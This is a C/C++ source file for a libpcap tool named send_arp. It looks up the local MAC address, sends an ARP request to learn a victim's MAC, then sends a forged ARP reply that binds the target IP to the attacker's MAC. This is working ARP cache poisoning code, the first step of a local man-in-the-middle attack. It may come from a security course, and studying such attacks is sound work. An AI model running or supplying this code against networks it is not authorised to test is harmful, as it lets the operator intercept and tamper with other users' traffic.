#include "arp.h"

void usage()
{
    printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
    printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

void convert_argv_into_ip(uint8_t* IP, char* argv)
{
    char* IPstring = strdup(argv);
    char* p = strtok(IPstring, ".");
    int i = 0;
    while(p != NULL)
    {
        IP[i] = strtoul(p, nullptr, 10);
        p = strtok(NULL, ".");
        i++;
    }

}

void get_attacker_info(uint8_t* attackermac, char* dev)
{
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, dev);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s))
    {
        int i;
        for (i = 0; i < 6; ++i)
        {
//            printf(" %02x", static_cast<uint8_t>(s.ifr_addr.sa_data[i]));
            attackermac[i] = static_cast<uint8_t>(s.ifr_addr.sa_data[i]);
        }
        puts("\n");
    }

}


void get_sender_MAC(pcap_t* fp, const uint8_t* attacker_MAC, const uint8_t* sender_IP, uint8_t* sender_mac)
{
    arp_packet arp_req_packet;
    //Ethernet header
    for (int i=0; i < 6; i++)
    {
        arp_req_packet.eth_hdr.h_dest[i] = 0xff;   //set broadcast MAC
        arp_req_packet.eth_hdr.h_source[i] = attacker_MAC[i];    //set source MAC
    }
    arp_req_packet.eth_hdr.h_proto = htons(ETH_P_ARP);

    //ARP header
    arp_req_packet.arp_hdr.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_req_packet.arp_hdr.ea_hdr.ar_pro = htons(0x0800);
    arp_req_packet.arp_hdr.ea_hdr.ar_hln = 0x06;
    arp_req_packet.arp_hdr.ea_hdr.ar_pln = 0x04;
    arp_req_packet.arp_hdr.ea_hdr.ar_op = htons(ARPOP_REQUEST);
    for (int i = 0; i < 6; i++)
    {
        arp_req_packet.arp_hdr.arp_sha[i] = attacker_MAC[i];
        arp_req_packet.arp_hdr.arp_tha[i] = 0x00;
    }
    for (int i = 0; i < 4; i++)
    {
        arp_req_packet.arp_hdr.arp_spa[i] = 0x00;
        arp_req_packet.arp_hdr.arp_tpa[i] = sender_IP[i];
    }

    u_char arp_to_send[42];
    memcpy(arp_to_send, &arp_req_packet, sizeof(arp_packet));
    if((pcap_sendpacket(fp, arp_to_send, sizeof(arp_req_packet))) != 0)
    {
        fprintf(stderr, "\nSending ARP_Request Failed");
    }
    else
    {
        while (true)
        {
            struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(fp, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;
//            printf("%u bytes captured\n", header->caplen);
            arp_packet* arp_rep_packet = reinterpret_cast<arp_packet*>(const_cast<u_char*>(packet));

            for (int i = 0; i < 4; i++)                 //checking1
            {
                if(arp_req_packet.arp_hdr.arp_tpa[i] != arp_rep_packet->arp_hdr.arp_spa[i])
                {
                    break;
                }
            }
            if (ntohs(arp_rep_packet->eth_hdr.h_proto) == ETH_P_ARP)// checking2
            {
                for (int i = 0; i < 6; i++)
                {
                    sender_mac[i] = arp_rep_packet->arp_hdr.arp_sha[i];
                }
                return;
            }
        }
    }
}

void arp_spoof(pcap_t* fp, uint8_t* sender_MAC, uint8_t* sender_IP, uint8_t* attacker_MAC, uint8_t* target_IP)
{
    arp_packet arp_poison;
    for (int i = 0; i < 6; i++)
    {
        arp_poison.eth_hdr.h_dest[i] = sender_MAC[i];
        arp_poison.eth_hdr.h_source[i] = attacker_MAC[i];
        arp_poison.arp_hdr.arp_sha[i] = attacker_MAC[i];
        arp_poison.arp_hdr.arp_tha[i] = sender_MAC[i];
    }
    arp_poison.eth_hdr.h_proto = htons(ETH_P_ARP);
    arp_poison.arp_hdr.ea_hdr.ar_op = htons(ARPOP_REPLY);
    arp_poison.arp_hdr.ea_hdr.ar_hln = 0x06;
    arp_poison.arp_hdr.ea_hdr.ar_pln = 0x04;
    arp_poison.arp_hdr.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_poison.arp_hdr.ea_hdr.ar_pro = htons(0x0800);

    for (int i = 0; i < 4; i++)
    {
        arp_poison.arp_hdr.arp_spa[i] = target_IP[i];
        arp_poison.arp_hdr.arp_tpa[i] = sender_IP[i];
    }

    u_char arp_to_send[42];
    memcpy(arp_to_send, &arp_poison, sizeof(arp_poison));
    if((pcap_sendpacket(fp, arp_to_send, sizeof(arp_to_send))) != 0)
    {
        fprintf(stderr, "\nSending ARP_Request Failed");
    }
}
